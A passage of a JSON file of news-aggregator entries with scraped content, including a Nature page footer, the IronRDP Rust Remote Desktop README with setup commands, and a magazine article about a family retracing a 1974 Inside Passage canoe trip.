Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .access-asia-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 5%;\n            margin-left: 5%;\n            font-size: 14px;\n            color: #222;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .access-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 14px;\n            color: #222;\n            opacity: 0.8px;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .price-buybox {\n            display: block;\n            font-size: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            padding-top: 30px;\n            text-align: center;\n          }\n          .BuyBoxSection .price-buybox-to {\n            display: block;\n            font-size: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            text-align: center;\n          }\n          .BuyBoxSection .price-info-text {\n            font-size: 16px;\n            padding-right: 10px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-value {\n            font-size: 30px;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-per-period {\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-from {\n            font-size: 14px;\n            padding-right: 10px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .issue-buybox {\n            display: block;\n            font-size: 13px;\n            text-align: center;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 19px;\n          }\n          .BuyBoxSection .no-price-buybox {\n            display: block;\n            font-size: 13px;\n            line-height: 18px;\n            text-align: center;\n            padding-right: 10%;\n            padding-left: 10%;\n            padding-bottom: 20px;\n            padding-top: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .vat-buybox {\n            display: block;\n            margin-top: 5px;\n            margin-right: 20%;\n            margin-left: 20%;\n            font-size: 11px;\n            color: #222;\n            padding-top: 10px;\n            padding-bottom: 15px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 17px;\n          }\n          .BuyBoxSection .tax-buybox {\n            display: block;\n            width: 100%;\n            color: #222;\n            padding: 20px 16px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: NaNpx;\n          }\n          .BuyBoxSection .button-container {\n            display: flex;\n            padding-right: 20px;\n            padding-left: 20px;\n            justify-content: center;\n          }\n          .BuyBoxSection .button-container > * {\n            flex: 1px;\n          }\n          .BuyBoxSection .button-container > a:hover,\n          .Button-505204839:hover,\n          .Button-1078489254:hover,\n          .Button-2737859108:hover {\n            text-decoration: none;\n          }\n          .BuyBoxSection .btn-secondary {\n            background: #fff;\n          }\n          .BuyBoxSection .button-asia {\n            background: #069;\n            border: 1px solid #069;\n            border-radius: 0;\n            cursor: pointer;\n            display: block;\n            padding: 9px;\n            outline: 0;\n            text-align: center;\n            text-decoration: none;\n            min-width: 80px;\n            margin-top: 75px;\n          }\n          .BuyBoxSection .button-label-asia,\n          .ButtonLabel-3869432492,\n          .ButtonLabel-3296148077,\n          .ButtonLabel-1636778223 {\n            display: block;\n            color: #fff;\n            font-size: 17px;\n            line-height: 20px;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            text-align: center;\n            text-decoration: none;\n            cursor: pointer;\n          }\n          .Button-505204839,\n          .Button-1078489254,\n          .Button-2737859108 {\n            background: #069;\n            border: 1px solid #069;\n            border-radius: 0;\n            cursor: pointer;\n            display: block;\n            padding: 9px;\n            outline: 0;\n            text-align: center;\n            text-decoration: none;\n            min-width: 80px;\n            max-width: 320px;\n            margin-top: 20px;\n          }\n          .Button-505204839 .btn-secondary-label,\n          .Button-1078489254 .btn-secondary-label,\n          .Button-2737859108 .btn-secondary-label {\n            color: #069;\n          }\n          .uList-2102244549 {\n            list-style: none;\n            padding: 0;\n            margin: 0;\n          }\n          /* style specs end */\n\n    Additional access options:\n\n            Log in\n\n            Learn about institutional subscriptions\n\n            Read our FAQs\n\n            Contact customer support\n\n                doi: https://doi.org/10.1038/d41586-025-00764-2\n\n                ReferencesLipson, M. et al. Nature https://doi.org/10.1038/s41586-025-08699-4 (2025).Article\n\n                    Google Scholar\n                Fregel, R. et al. Proc. Natl Acad. Sci. USA 115, 6774–6779 (2018).Article\n    PubMed\n\n                    Google Scholar\n                Simões, L. G. et al. Nature 618, 550–556 (2023).Article\n    PubMed\n\n                    Google Scholar\n                Download references\n\n                    Reprints and permissions\n\n                Subjects\n\n                Evolution\n\n                Genomics\n\n                Agriculture\n\n    Latest on:\n\n                Evolution\n\n                                    Long-term studies provide unique insights into evolution\n                                    Review Article 19 MAR 25\n\n                                    Drivers of avian genomic change revealed by evolutionary rate decomposition\n                                    Article 19 MAR 25\n\n                                    Fossilized dinosaur cells that defied the ravages of time — 20 years since a key discovery\n                                    News & Views 17 MAR 25\n\n                Genomics\n\n                                    Mutations that accrue through life set the stage for stomach cancer\n                                    News & Views 19 MAR 25\n\n                                    Spatially resolved mapping of cells associated with human complex traits\n                                    Article 19 MAR 25\n\n                                    The somatic mutation landscape of normal gastric epithelium\n                                    Article 19 MAR 25\n\n                Agriculture\n\n                                    Fate of pistachio production in Iran holds lessons for the world\n                                    Correspondence 11 MAR 25\n\n                                    Genus-wide plant pangenome could inform next-generation crop design\n                                    News & Views 05 MAR 25\n\n                                    Why farmers are beginning to take their government to court over climate change\n                                    Comment 28 JAN 25\n\n                                    Long-term studies provide unique insights into evolution\n                                    Review Article 19 MAR 25\n\n                                    Drivers of avian genomic change revealed by evolutionary rate decomposition\n                                    Article 19 MAR 25\n\n                                    Fossilized dinosaur cells that defied the ravages of time — 20 years since a key discovery\n                                    News & Views 17 MAR 25\n\n            Jobs\n\n                        New Positions open for the laser science center in Peking University\n\n                            The Beijing Laser Accelerator Innovation Center at Peking University invites applications for Applied Physics faculty.\n                            Beijing, China\n                            Peking University (PKU)\n\n                        Department Chair for Biomedical Engineering / University of Utah\n\n                            The recently endowed John and Marcia Price College of Engineering at the University of Utah is now accepting applications\n                            Salt Lake City, Utah\n                            University of Utah Biomedical Engineering\n\n                        Research Associate\n\n                            We are seeking an experienced and motivated Research Associate to join our dynamic research team in the Douglas Lab!\n                            Dallas, Texas (US)\n                            UT Southwestern Medical Center - Douglas Laboratory\n\n                        Postdoctoral Researcher in Brain-Computer Interaction, Neuromodulation, and Clinical Applications\n\n                            Join a cutting-edge research team in brain-computer interaction and neuromodulation for clinical applications.\n                            Shanghai, China\n                            Fudan University\n\n                        Schaller Research Group Leader Positions in Infectious Diseases at Heidelberg University\n\n                            Applications are invited for additional Schaller Research Group Leaders in the field of infectious diseases\n                            Heidelberg, Baden-Württemberg (DE)\n                            The Chica and Heinz Schaller Foundation",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6bc5028df4e5f69a",
    "title": {
      "en": "Facebook to stop targeting ads at UK woman after legal fight",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.bbc.co.uk/news/articles/c1en1yjv4dpo",
    "score": 126,
    "by": "dijksterhuis",
    "time": 1742660568,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a46cfad92e25d229",
    "title": {
      "en": "IronRDP: a Rust implementation of Microsoft's RDP protocol",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/Devolutions/IronRDP",
    "score": 513,
    "by": "mikece",
    "time": 1742571327,
    "content": "IronRDP\n\nA collection of Rust crates providing an implementation of the Microsoft Remote Desktop Protocol, with a focus on security.\nDemonstration\n\n    ironrdp-tauri-client-hackaton-result.mp4\n\nVideo Codec Support\nSupported codecs:\n\nUncompressed raw bitmap\nInterleaved Run-Length Encoding (RLE) Bitmap Codec\nRDP 6.0 Bitmap Compression\nMicrosoft RemoteFX (RFX)\n\nExamples\nironrdp-client\nA full-fledged RDP client based on IronRDP crates suite, and implemented using non-blocking, asynchronous I/O.\ncargo run --bin ironrdp-client -- <HOSTNAME> --username <USERNAME> --password <PASSWORD>\n\nscreenshot\nExample of utilizing IronRDP in a blocking, synchronous fashion.\nThis example showcases the use of IronRDP in a blocking manner. It\ndemonstrates how to create a basic RDP client with just a few hundred lines\nof code by leveraging the IronRDP crates suite.\nIn this basic client implementation, the client establishes a connection\nwith the destination server, decodes incoming graphics updates, and saves the\nresulting output as a BMP image file on the disk.\ncargo run --example=screenshot -- --host <HOSTNAME> --username <USERNAME> --password <PASSWORD> --output out.bmp\n\nHow to enable RemoteFX on server\nRun the following PowerShell commands, and reboot.\nSet-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'ColorDepth' -Type DWORD -Value 5\nSet-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'fEnableVirtualizedGraphics' -Type DWORD -Value 1\n\nAlternatively, you may change a few group policies using gpedit.msc:\n\nRun gpedit.msc.\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/RemoteFX for Windows Server 2008 R2/Configure RemoteFX\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/Enable RemoteFX encoding for RemoteFX clients designed for Windows Server 2008 R2 SP1\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/Limit maximum color depth\n\nReboot.\n\nArchitecture\nSee the ARCHITECTURE.md document.\nGetting help\n\nReport bugs in the issue tracker\nDiscuss the project on the matrix room",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "f23b54230c88f0e0",
    "title": {
      "en": "Programmer vs. Developer: 1 in 4 programming jobs have vanished",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.msn.com/en-us/money/careers/1-in-4-programming-jobs-have-vanished-what-happened/ar-AA1AUumu",
    "score": 8,
    "by": "jnord",
    "time": 1742684886,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "87c562eca48f4e1f",
    "title": {
      "en": "43-year-old Family Canoe Trip",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://paddlingmag.com/stories/features/legendary-43-year-family-canoe-story/",
    "score": 91,
    "by": "cameron_b",
    "time": 1742299581,
    "content": "Home  Stories  Features  A Legendary 43-Year Family Canoe Story\n\n                TripsAdventuresStoriesFamilyFeatures                A Legendary 43-Year Family Canoe Story\n\n                                    800-miles through time and wilderness up the Inside Passage\n\n\t\tFacebookTwitterPinterestEmailMix\n\nOn June 14, 1974, my grandma Glady dropped her two sons off at a marina in the Puget Sound. They loaded gear into homemade woodstrip canoes and pushed off into the cold, black water.Decades later, Grandma told me as she watched them disappear into the fog, she wondered if she would ever see her boys again.\nMy dad, Alan, and his best friend and younger brother, Andy, had been planning this trip for years. They were climbers, mountaineers and fishermen. Before leaving college and entering what they remember calling “the real world,” they wanted one last adventure—an experience truly unknown and challenging; something beautiful they could share as brothers, and with my dad’s girlfriend, Sara, who would later become his wife and my mother, and a small band of college friends.\n\nAfter my dad finished college, he and my uncle built their own canoes in a college basement, launched them into the Pacific, and became some of the first people in recent history to canoe the Inland Passage from Vancouver to Alaska.\nTheir story became a legend in my family. One of the original boats still hangs in my parent’s garage. My brother, Ben, and I grew up paddling the old canoe—fishing from it in the Pacific Northwest and beating it up in eastern rivers, like the Shenandoah. As we reeled in fish and cut through waterways, we couldn’t help but marvel at the craft our dad built and wonder what the 1974 adventure was actually like.\nWhen I was 16, I unearthed a dusty cardboard box behind my dad’s CDs and cassette tapes. Carelessly written on the top of the box were the words, Canoe Trip. The images and film negatives I found inside painted vivid pictures of the 1974 legend—a story of risk, naysayers and adventure. I studied the photographs countless times, mesmerized by images of my 20-year-old parents on the adventure of a lifetime.\nLooking back now, almost two decades after finding the images, I’m certain the story of my parents’ journey on the Inside Passage shaped my life choices. How could a journey I never directly experienced have had such a profound impact on me?\nBefore I could answer this question, I needed to understand what really happened in 1974. And so, for nearly a year, I worked on a documentary about their legendary canoe trip. In the process, I learned volumes about the real journey, my parents and myself.\n\n\t\t\t\t<img fetchpriority=\"high\" decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage4.jpg\" class=\"attachment-full size-full\" alt=\"man sitting in an old truck\" aria-describedby=\"gallery-1-18310\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage4.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“The good thing when you’re young and you come up with an idea that everyone thinks is crazy is that you’re too young to understand they perspective, you just think they’re crazy and they don’t understand.” -Alan Dappen, pictured in 1974. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage5.jpg\" class=\"attachment-full size-full\" alt=\"man smiling\" aria-describedby=\"gallery-1-18311\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage5.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tAlan Dappen pictured in 2017. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage7.jpg\" class=\"attachment-full size-full\" alt=\"man with camera\" aria-describedby=\"gallery-1-18313\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage7.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBrother Andy in 1974. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage6.jpg\" class=\"attachment-full size-full\" alt=\"man smiling\" aria-describedby=\"gallery-1-18312\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage6.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBrother Andy in 2017. | Photo: Courtesy of Nate & Alan Dappen\n\nThe story started in 1970.After my dad finished high school, he got a job as a deckhand on a yacht called the Thea Foss, taking guests up and down the Inside Passage, a labyrinth of straits and islands extending from Washington State up the coast of British Columbia and well into Alaska. Stuck on the boat, he watched the coastline pass by and dreamed of fishing and camping along its banks.\nHis summer experience sowed the seed of a grand idea to canoe the entire coastal waterway. He rushed home from his summer job to share this dream with his younger brother, Andy.My Dad and Andy had a unique relationship as brothers.Close in age, they were best friends throughout childhood and when they went off to university at Whitman College they roomed together.\nAs early adopters of outdoor adventure, they spent their weekends climbing, camping, fishing and ski-mountaineering in the wilderness of the Pacific Northwest. Together, they set a goal of embarking on a journey along the Inside Passage just after my dad graduated from college and before medical school consumed him.The only obstacles standing in their way were a lack of canoes and empty pockets.\nDetermined to make this trip a reality, they found a man in Bellingham, Washington who shared building plans. For the last six months of university, the duo worked every night in the college art building, sawing, sanding, bending and varnishing. With $500 and a lot of elbow grease, they built three gleaming cedarstrip canoes before graduating.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-adventure-through-passage1.jpg\" class=\"attachment-full size-full\" alt=\"people building canoes\" aria-describedby=\"gallery-2-18316\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-adventure-through-passage1.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tHard at work building boats after class. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-journey-through-passage.jpg\" class=\"attachment-full size-full\" alt=\"\" aria-describedby=\"gallery-2-18317\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-journey-through-passage.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“If you were to buy these boats they would cost $3,000, $4,000, maybe $5,000. But we could make these woodstrip canoes for $150 at the time. We made these pieces of art because it was the cheapest option.”-Andy Dappen | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage8.jpg\" class=\"attachment-full size-full\" alt=\"people paddling a canoe in black and white\" aria-describedby=\"gallery-2-18314\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage8.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tTesting the homemade works of art. | Photo: Courtesy of Nate & Alan Dappen\n\nAt the time, only a few people had ever canoed the entire coastline, and there was virtually no information available.During the building process, my dad and Andy sent letters to fishermen, loggers, writers, homesteaders and the Forest Service—anyone and everyone they could think of who lived along the coast and could give them advice about canoeing the Passage.\nThe letters returned were almost unanimously apocalyptic. “Go home and sell your canoes,” they read. “You’re going to kill yourselves,” wrote another. “People go down in big boats on those waterways. Why are you going in a canoe?” Letter after letter returned, urging them not to do it. Finally, just a few weeks before they were planning to leave, one letter returned with the response they were waiting for. It began, “Do it. It’ll be the best trip of your life.”\nAt the time, my dad was dating a Wellesley college girl named Sara, who would eventually become my mother. They had been together for about a year, and he decided this canoe trip would be a good opportunity to get to know each other better. As an invitation, he sent her a survival kit filled with trinkets and tools he said would sustain her during the voyage. She accepted without hesitation. Soon after her parents sent her to a psychiatrist to attempt to talk her out of going.\nAs the story goes, by the time their sessions were over, the psychiatrist wanted to join the expedition.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-adventure-through-passage9.jpg\" class=\"attachment-full size-full\" alt=\"group of people wearing life jackets and holding paddles\" aria-describedby=\"gallery-3-18307\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-adventure-through-passage9.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tOne member of the 1974 paddling crew dropped out a couple weeks into the journey. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage10.jpg\" class=\"attachment-full size-full\" alt=\"canoes paddling in the distance with mountains in the background\" aria-describedby=\"gallery-3-18304\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage10.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tThe rest continued onto Ketchikan. | Photo: Courtesy of Nate & Alan Dappen\n\nOn June 14, 1974, my 20-year-old father, mother and uncle, along with a small crew of their friends, launched their three homemade canoes into the Pacific and began an eight-week journey along the Inside Passage.\nFor the next two months, they paddled, fished and camped in one of North America’s wildest landscapes. After their adventures along the coast, they returned home as different people. The canoe trip had changed them, and the story of the grand adventure lived on long after summer faded. Over the next 40 years, tales from their trip were told, and retold. Through a game of telephone and the metamorphosis of aging memories, the story of their adventure became morphed, exaggerated, forgotten and remembered. By the time I became an adult, it was hard for me to separate fact from legend. In my mind, and even in the minds of my parents, they had returned home upon the completion of their intended journey. But as a kid you never really get the full story.\n\nSome of the group needed to go back to college and had enough, while others wanted to continue on to Juneau, their intended destination. They had never completed the original trip as intended.\n\nIn September 2015, as we prepared centerpieces for the guest tables at my wedding, my uncle Andy told me by the time the group reached Ketchikan, about 800 miles from their starting point, the crew was divided. Some of the group needed to go back to college and had enough, while others wanted to continue on to Juneau, their intended destination. They had never completed the original trip as intended.\nWhen my dad and Andy started this trip, they were young men with endless possibilities in their lives. Now, 43 years later, they are both nearing the ends of their careers, with more time behind them than ahead. But they still had at least one big adventure left in them. On my wedding day, my brother, Andy, my dad and I made a plan. We decided to refurbish the canoes, return to the Inside Passage and complete the journey through the Pacific Northwest that had shaped them so profoundly as young men.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage11.jpg\" class=\"attachment-full size-full\" alt=\"fixing a canoe\" aria-describedby=\"gallery-4-18305\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage11.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tThe 2017 crew stripped down the boats and re-glassed the hulls. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/Hero_Template.jpg\" class=\"attachment-full size-full\" alt=\"two mend standing behind two canoes\" aria-describedby=\"gallery-4-18315\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/Hero_Template.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“It’s incredibly cool, you can see its old battle scars and history,” says Alan. | Photo: Courtesy of Nate & Alan Dappen\n\nOur first challenge was getting the four-decade-old canoes ready. When the crew returned home from Alaska in 1974, one canoe went with my parents, one with Andy, and the third was left at my grandparents’ house. Each canoe took on a life of its own. Andy became a professional adventure journalist, taking his canoe on even more epic journeys in places like the Yukon and on the Peace River. The canoe in my grandparents’ house became the Puget Sound fishing vessel on family visits. And the canoe my parents kept became a cornerstone of our childhood adventures. These boats were old, and needed work before they could complete the journey they were intended for.\nIt took a week to repair two of the canoes.When ready, the four of us ferried for two days from Bellingham, Washington to Ketchikan, Alaska. Our aim was to fulfill the original 1974 goal of reaching Juneau, a 300-mile paddle from Ketchikan.\n\nThe day we arrived in Ketchikan the rain poured and the wind howled. After just a few hours of paddling up the Tongass Narrows, everything and everyone was soaked. We were in the water for less than five hours before the weather turned and forced us to land on Gravian Island. We stayed there for two days, stranded by wind and high seas. Finally, the sun came out and we continued north.\nI was moved by the beauty and richness of the landscape. Every day, humpback whales breached around us. Pods of harbor porpoises rounded our canoes. Sea lions appeared suddenly around our boats, only to disappear a moment later and bark in the distance. Mink ate the many fish carcasses we disposed of after dining on the spoils of our outrageously productive fishing efforts. Evidence of bears was common and once, a young brown bear paraded through our camp, inspecting our canoes before entering the channel and swimming a half-mile to the other side. Even as a wildlife filmmaker, I have rarely seen such abundance.\n\nAs the days and nights melted into one another, and time disappeared, we shared stories, catching up on years of our busy, distant lives.\n\nA few days into the trip, as we paddled steadily through this remarkable landscape, Ben and I realized this was the longest time we had spent together since he left home for college 18 years earlier. For my dad and Andy, this was the longest they had spent together since the 1974 canoe trip, 43 years earlier. As the days and nights melted into one another, and time disappeared, we shared stories, catching up on years of our busy, distant lives.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-journey-through-passage.jpg\" class=\"attachment-full size-full\" alt=\"4 people standing in front of a lake with canoes\" aria-describedby=\"gallery-5-18306\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-journey-through-passage.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBen Dappen, writer Nate Dappen, Uncle Andy Dappen, and father Alan Dappen. | Photo: Courtesy of Alan and 